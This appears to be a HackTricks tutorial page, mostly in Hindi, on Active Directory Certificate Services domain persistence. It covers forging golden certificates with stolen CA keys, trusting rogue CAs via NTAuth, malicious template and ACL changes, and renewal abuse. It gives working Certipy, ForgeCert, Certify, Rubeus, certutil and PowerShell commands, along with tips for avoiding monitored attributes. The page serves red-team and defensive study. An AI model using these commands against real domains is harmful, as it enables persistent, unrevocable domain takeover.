# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा की गई domain persistence techniques का सारांश है।** आगे के विवरण के लिए इसमें देखें।

## चोरी किए गए CA सर्टिफिकेट के साथ सर्टिफिकेट बनाना (Golden Certificate) - DPERSIST1

क्या आप कैसे पहचान सकते हैं कि कोई सर्टिफिकेट CA सर्टिफिकेट है?

यह निर्धारित किया जा सकता है कि कोई सर्टिफिकेट CA सर्टिफिकेट है यदि निम्नलिखित शर्तें पूरी हों:

- सर्टिफिकेट CA सर्वर पर संग्रहीत होता है, और इसका private key मशीन के DPAPI द्वारा सुरक्षित होता है, या यदि ऑपरेटिंग सिस्टम इसका समर्थन करता है तो TPM/HSM जैसे हार्डवेयर द्वारा।
- सर्टिफिकेट के Issuer और Subject फ़ील्ड दोनों CA के distinguished name से मेल खाते हैं।
- CA सर्टिफिकेट्स में विशेष रूप से "CA Version" extension मौजूद होता है।
- सर्टिफिकेट में Extended Key Usage (EKU) फ़ील्ड मौजूद नहीं होते।

इस सर्टिफिकेट की private key निकालने के लिए, CA सर्वर पर `certsrv.msc` टूल बिल्ट-इन GUI के माध्यम से समर्थित तरीका है। तथापि, यह सर्टिफिकेट सिस्टम में संग्रहीत अन्य सर्टिफिकेट्स से अलग नहीं है; इसलिए निकालने के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसी विधियों को लागू किया जा सकता है।

सर्टिफिकेट और private key को Certipy का उपयोग करके निम्न कमांड से भी प्राप्त किया जा सकता है:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA certificate और इसकी private key `.pfx` फ़ॉर्मेट में प्राप्त करने पर, [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे टूल्स का उपयोग वैध प्रमाणपत्र उत्पन्न करने के लिए किया जा सकता है:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> प्रमाणपत्र जाली करने के लिए लक्षित उपयोगकर्ता Active Directory में सक्रिय और प्रमाणीकरण करने में सक्षम होना चाहिए, अन्यथा प्रक्रिया सफल नहीं होगी। krbtgt जैसे विशेष खातों के लिए प्रमाणपत्र जाली करना अप्रभावी है।

This forged certificate will be **valid** until the end date specified and as **long as the root CA certificate is valid** (usually from 5 to **10+ years**). It's also valid for **machines**, so combined with **S4U2Self**, an attacker can **maintain persistence on any domain machine** for as long as the CA certificate is valid.\
Moreover, the **certificates generated** with this method **cannot be revoked** as CA is not aware of them.

### Strong Certificate Mapping Enforcement (2025+) के तहत संचालन

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- लक्षित खाते से मजबूत बाइंडिंग हो (उदाहरण के लिए, the SID security extension), or
- लक्ष्य ऑब्जेक्ट के `altSecurityIdentities` attribute पर एक मजबूत, स्पष्ट मैपिंग के साथ जोड़ा गया हो।

A reliable approach for persistence is to mint a forged certificate chained to the stolen Enterprise CA and then add a strong explicit mapping to the victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- यदि आप forged certificates तैयार कर सकते हैं जिनमें SID security extension शामिल है, तो वे Full Enforcement के तहत भी implicitly map होंगे। अन्यथा, explicit strong mappings को प्राथमिकता दें। See [account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation यहाँ defenders की मदद नहीं करता: forged certificates CA database के लिए अज्ञात होते हैं और इसलिए revoked नहीं किए जा सकते।

#### Full-Enforcement संगत forging (SID-aware)

Updated tooling आपको SID को सीधे embed करने देता है, जिससे golden certificates उपयोगी बने रहते हैं भले ही DCs weak mappings अस्वीकार कर दें:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID एम्बेड करके आप `altSecurityIdentities` को छूने की आवश्यकता से बच जाते हैं, जिसे मॉनिटर किया जा सकता है, और फिर भी मजबूत मैपिंग चेक्स को पूरा करते हैं।

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object को परिभाषित किया गया है ताकि इसका `cacertificate` attribute एक या अधिक **CA प्रमाणपत्र** रखे, जिनका उपयोग Active Directory (AD) करता है। ऑथेंटिकेशन की जाँच प्रक्रिया **डोमेन कंट्रोलर** द्वारा यह सत्यापित करती है कि `NTAuthCertificates` object में कोई एंट्री मौजूद है जो ऑथेंटिकेट कर रहे **प्रमाणपत्र** के Issuer फ़ील्ड में निर्दिष्ट **CA** से मेल खाती हो। यदि मेल मिलता है तो authentication आगे बढ़ती है।

यदि किसी हमलावर के पास इस AD ऑब्जेक्ट पर नियंत्रण है, तो वह `NTAuthCertificates` ऑब्जेक्ट में एक self-signed CA प्रमाणपत्र जोड़ सकता है। सामान्यतः केवल **Enterprise Admin** समूह के सदस्य, साथ में **Domain Admins** या **Administrators** जो **forest root’s domain** में हैं, को इस ऑब्जेक्ट को संशोधित करने की अनुमति दी जाती है। वे `NTAuthCertificates` ऑब्जेक्ट को `certutil.exe` का उपयोग करके कमांड `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` से संपादित कर सकते हैं, या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग करके।

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
यह क्षमता विशेष रूप से प्रासंगिक है जब इसे पहले वर्णित उस विधि के साथ मिलाकर प्रयोग किया जाता है जिसमें ForgeCert का उपयोग करके प्रमाणपत्रों को डायनामिक रूप से जनरेट किया जाता है।

> Post-2025 मैपिंग पर विचार: NTAuth में एक rogue CA लगाने से केवल जारी करने वाली CA पर ही विश्वास स्थापित होता है। जब DCs **Full Enforcement** में हों और आप लॉगऑन के लिए leaf certificates का उपयोग करना चाहें, तो leaf में या तो SID security extension होना चाहिए या लक्ष्य ऑब्जेक्ट पर एक मजबूत स्पष्ट मैपिंग होनी चाहिए (उदाहरण के लिए, Issuer+Serial को `altSecurityIdentities` में)। देखें {{#ref}}account-persistence.md{{#endref}}।

## Malicious Misconfiguration - DPERSIST3

AD CS कॉम्पोनेंट्स के **security descriptor** संशोधनों के माध्यम से **persistence** के अवसर प्रचुर हैं। "[Domain Escalation](domain-escalation.md)" सेक्शन में वर्णित संशोधनों को उच्च अधिकार प्राप्त एक attacker द्वारा maliciously लागू किया जा सकता है। इसमें संवेदनशील कॉम्पोनेंट्स पर "control rights" (उदा., WriteOwner/WriteDACL/आदि) जोड़ना शामिल है, जैसे:

- **CA सर्वर का AD कंप्यूटर** ऑब्जेक्ट
- **CA सर्वर का RPC/DCOM सर्वर**
- किसी भी **descendant AD object या container** जो **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** में हो (उदाहरण के लिए, Certificate Templates container, Certification Authorities container, NTAuthCertificates object, आदि)
- डिफ़ॉल्ट या संगठन द्वारा AD CS को नियंत्रित करने के लिए delegated किए गए **AD groups** (जैसे built-in Cert Publishers group और इसके किसी भी सदस्य)

एक malicious कार्यान्वयन के उदाहरण में ऐसा होगा कि domain में elevated permissions रखने वाला attacker डिफ़ॉल्ट `User` certificate template पर `WriteOwner` permission जोड़ दे, और attacker ही उस अधिकार का principal हो। इसका फायदा उठाने के लिए attacker पहले `User` template का ownership खुद में बदल देगा। इसके बाद `mspki-certificate-name-flag` को template पर `1` पर सेट किया जाएगा ताकि `ENROLLEE_SUPPLIES_SUBJECT` सक्षम हो सके, जिससे अनुरोध में कोई user Subject Alternative Name प्रदान कर सके। इसके बाद attacker उस `template` का उपयोग करके `enroll` कर सकता है, alternative name के रूप में एक `domain administrator` नाम चुनकर, और प्राप्त प्रमाणपत्र का उपयोग DA के रूप में authentication के लिए कर सकता है।

दीर्घकालिक domain persistence के लिए attackers द्वारा सेट किए जाने वाले व्यावहारिक विकल्प (पूर्ण विवरण और डिटेक्शन के लिए देखें {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags जो requesters से SAN की अनुमति देते हैं (उदा., `EDITF_ATTRIBUTESUBJECTALTNAME2` को सक्षम करना)। यह ESC1- जैसे रास्तों को exploitable बनाए रखता है।
- Template DACL या सेटिंग्स जो authentication-capable issuance की अनुमति देती हैं (उदा., Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम करना)।
- यदि defenders cleanup का प्रयास करते हैं तो rogue issuers को लगातार पुनः-परिचय कराने के लिए `NTAuthCertificates` object या CA containers को नियंत्रित करना।

> [!TIP]
> KB5014754 के बाद कड़े किए गए environments में, इन misconfigurations को explicit strong mappings (`altSecurityIdentities`) के साथ जोड़ने पर यह सुनिश्चित होता है कि आपके जारी या forged प्रमाणपत्र तब भी उपयोगी बने रहें जब DCs strong mapping लागू करते हैं।

### Certificate renewal abuse (ESC14) for persistence

यदि आप किसी authentication-capable certificate (या किसी Enrollment Agent certificate) को compromise कर लेते हैं, तो आप उसे तब तक अनिश्चितकाल तक renew कर सकते हैं जब तक जारी करने वाला template प्रकाशित रहता है और आपका CA issuer chain पर भरोसा करता रहता है। Renewal मूल identity बाइंडिंग्स को बनाए रखता है पर वैधता बढ़ा देता है, जिससे eviction कठिन हो जाती है जब तक कि template ठीक न किया जाए या CA को पुनः प्रकाशित न किया जाए।
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
यदि डोमेन कंट्रोलर **Full Enforcement** में हैं, तो `-sid <victim SID>` जोड़ें (या ऐसा टेम्पलेट इस्तेमाल करें जिसमें SID security extension अभी भी शामिल हो) ताकि रिन्यू किए गए leaf certificate बिना `altSecurityIdentities` को छुए भी मजबूत रूप से मैप करना जारी रखे। CA admin rights वाले attackers `policy\RenewalValidityPeriodUnits` को tweak करके नवीनीकृत lifetimes को बढ़ा सकते हैं, ताकि वे अपने लिए cert जारी करने से पहले अधिक लंबी वैधता पा सकें।

## संदर्भ

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
